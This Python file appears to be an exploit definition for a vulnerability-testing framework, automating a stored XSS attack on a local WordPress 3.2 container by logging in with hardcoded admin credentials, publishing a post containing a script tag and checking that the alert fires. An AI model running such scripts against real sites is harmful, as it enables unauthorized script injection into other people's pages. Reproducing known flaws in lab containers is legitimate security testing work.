from data.exploits.framework.BasicExploit import BasicExploit
import time

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'Wordpress_3_2_XSS',
      'Description' : "XSS vulnerabiity in Wordpress application",
      'References' :  [["empty"]],
      'Target' :      "wordpress3.2",
      'Container': 'ubuntu-apache-mysql',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'XSS'
    }

    def runExploit(self):
        wrapper = self.wrapper 
        wrapper.navigate("http://localhost:49160/wordpress/wp-login.php")
        login = wrapper.find("user_login")
        login.clear()
        login.keys(" wpadmin")
        password = wrapper.find("user_pass")
        password.clear()
        password.keys("wpadminpw21")
        wrapper.find("wp-submit").click()

        wrapper.navigate("http://localhost:49160/wordpress/wp-admin/edit.php")
        wrapper.find("row-title").click()

        content = wrapper.find("content")
        content.clear()
        content.keys("<script>alert(1)</script>")
        wrapper.find("publish").click()
        wrapper.navigate("http://localhost:49160/wordpress/?p=1")

        alert_text = wrapper.handle_alert()
        self.assertIn("1", alert_text, "Exploit didn't work!")